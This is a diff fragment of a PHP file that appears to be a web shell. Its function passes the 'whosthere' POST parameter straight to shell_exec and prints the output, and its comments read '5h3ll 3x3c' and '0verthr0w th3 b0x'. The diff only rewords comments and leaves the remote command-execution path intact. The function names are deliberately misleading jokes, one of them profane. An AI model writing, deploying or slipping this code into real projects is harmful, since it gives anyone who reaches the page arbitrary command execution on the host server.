@@ -30,15 +30,15 @@ function continental_breakfast_is_not_real_breakfast($cmd){
 		echo "<banana>$ ". $cmd ."</banana>\r\n\r\n". shell_exec($cmd." 2>&1");
 }
 
+
 function main(){
 
 	// top html
 	echo fuck_abbott(0);
 
-	// this is only false when some1 first
-	// accesses the page, to stop it running
-	// empty commands or w/e
-	if (isset($_POST["whosthere"])) { // 5h3ll 3x3c
+	// if a command is recieved in the POST,
+	if (isset($_POST["whosthere"])) {
+		// 0verthr0w th3 b0x
 		continental_breakfast_is_not_real_breakfast($_POST['whosthere']);
 	}
 
